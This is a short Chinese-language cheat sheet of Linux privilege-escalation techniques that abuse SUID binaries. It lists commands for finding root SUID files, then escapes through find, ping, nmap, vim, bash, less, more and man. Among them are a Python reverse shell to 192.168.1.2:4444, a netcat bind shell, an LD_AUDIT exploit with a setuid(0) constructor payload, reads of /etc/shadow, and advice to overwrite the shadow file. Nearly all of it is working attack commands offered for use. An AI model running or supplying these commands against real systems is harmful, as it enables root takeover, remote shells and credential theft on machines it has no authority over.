	查找有root权限的SUID文件
	$find / -perm -u=s -type f 2>/dev/null
	$find / -user root -perm -4000 -print 2>/dev/null
	$find / -user root -perm -4000 -exec ls -ldb {} \;
  ##### Find
	$touch xxx
	$/usr/bin/find xxx –exec whoami \;
	$/usr/bin/find xxx –exec python -c 'import 	socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  \;
	&
	>find xxx -exec netcat -lvp 12138 -e /bin/sh \; 然后攻击机主动连接
  ##### Ping
    >cd /tmp
    >mkdir exploit
    >ln /bin/ping /tmp/exploit/cmd
    >exec 3< /tmp/exploit/cmd
    >rm -rf /tmp/exploit/
    >vim payload.c
```c
void __attribute__((constructor)) init()  // 两个下划线
{
     setuid(0);
     system("/bin/bash");
}
```
    >gcc -W -fPIC -shared -o /tmp/exploit payload.c
    >提升到root权限
    >LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
    >id 查看当前权限
  ##### NMAP
	# 进入nmap的交互模式
	>nmap --interactive 
	>!sh
  ##### VIM
	>vim.tiny /etc/shadow
	&
	>vim.tiny
	# 按ESC
	:set shell=/bin/sh
	:shell
  ##### BASH
	>bash –p
  ##### More/Less/Man
	>less /etc/passwd
	!/bin/sh
	>more /etc/passwd
	!/bin/bash
	>man passwd
	!/bin/bash
  ##### CP/MV
	覆盖shadow文件
  ##### AutoSUID
  	https://github.com/IvanGlinkin/AutoSUID/
	自动收集 SUID 可执行文件并找到进一步提升权限的方法。100% 自动化。
	chmod +x AutoSUID.sh
	./AutoSUID.sh